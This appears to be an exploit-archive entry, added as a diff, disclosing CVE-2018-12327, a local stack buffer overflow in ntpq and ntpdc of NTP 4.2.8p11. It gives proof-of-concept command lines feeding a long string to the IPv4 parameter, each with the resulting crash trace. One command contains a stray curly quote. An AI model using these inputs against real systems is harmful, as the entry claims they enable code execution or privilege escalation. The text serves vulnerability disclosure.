@@ -1,0 +1,26 @@
+# Exploit Title: ntpq and ntpdc 4.2.8p11 Local Buffer Overflow
+# Date: 2018-06-06
+# Exploit Author: Fakhri Zulkifli (@d0lph1n98)
+# Vendor Homepage: http://www.ntp.org/
+# Software Link: http://www.ntp.org/downloads.html
+# Version: 4.2.8p11 and earlier
+# Tested on: 4.2.8p11
+# CVE : CVE-2018-12327
+
+Stack-based buffer overflow in ntpq and ntpdc of NTP version 4.2.8p11 allows a local attacker to achieve code execution or escalate to higher privileges via a long string as the argument for an IPv4 or IPv6 command-line parameter.
+
+$ ./ntpq -4 [`python -c 'print "A" * 300’`]
+
+#0 0x562fcada86ce in openhost /home/user/ntp-4.2.8p11/ntpq/ntpq.c:655:12
+#1 0x562fcada5f2a in ntpqmain /home/user/ntp-4.2.8p11/ntpq/ntpq.c:606:10
+#2 0x562fcada4729 in main /home/user/ntp-4.2.8p11/ntpq/ntpq.c:469:9
+#3 0x7f79b684982f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
+#4 0x562fcac96d88 in _start (/home/user/ntp-4.2.8p11/ntpq/ntpq+0xacd88)
+
+$ ./ntpdc -4 [`python -c 'print "A" * 300'`]
+
+#0 0x55f726641efe in openhost /home/user/ntp-4.2.8p11/ntpdc/ntpdc.c:413:12
+#1 0x55f7266400d4 in ntpdcmain /home/user/ntp-4.2.8p11/ntpdc/ntpdc.c:365:10
+#2 0x55f72663f269 in main /home/user/ntp-4.2.8p11/ntpdc/ntpdc.c:255:9
+#3 0x7f0fc632382f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
+#4 0x55f7265362d8 in _start (/home/user/ntp-4.2.8p11/ntpdc/ntpdc+0x9d2d8)
